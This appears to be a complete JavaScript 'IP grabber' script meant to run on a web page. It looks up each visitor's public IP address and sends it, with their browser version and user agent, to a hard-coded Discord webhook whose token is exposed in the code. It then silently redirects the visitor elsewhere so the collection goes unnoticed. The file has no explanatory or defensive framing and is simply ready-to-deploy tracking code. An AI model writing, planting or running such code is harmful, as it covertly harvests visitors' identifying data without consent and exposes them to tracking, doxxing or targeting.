$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/834149158021496892/9WCAwqFE4qVgS7rTUg7AOjXxT_x0OLV7tvhzWGRxwEvZhjq_8ObtEYmiKA5V6YGy500v");
    request.setRequestHeader('Content-type', 'application/json');

    request.onloadend = () => {
        setTimeout(function() {
            if (window.location.href.includes("#")) {
                var loc = window.location.href.split("#").pop();
                window.location = loc;
            } else {
                window.location = "https://" + window.location.hostname;
            }
        }, 100);
    }

    var params = {
        username: "IP Grabber",
        content: "```"
               + "IP: " + data.ip + "\n\n"
               + "appVersion: " + navigator.appVersion + "\n\n"
               + "userAgent: " + navigator.userAgent + "\n\n"
               + "```"
    }

    request.send(JSON.stringify(params));
});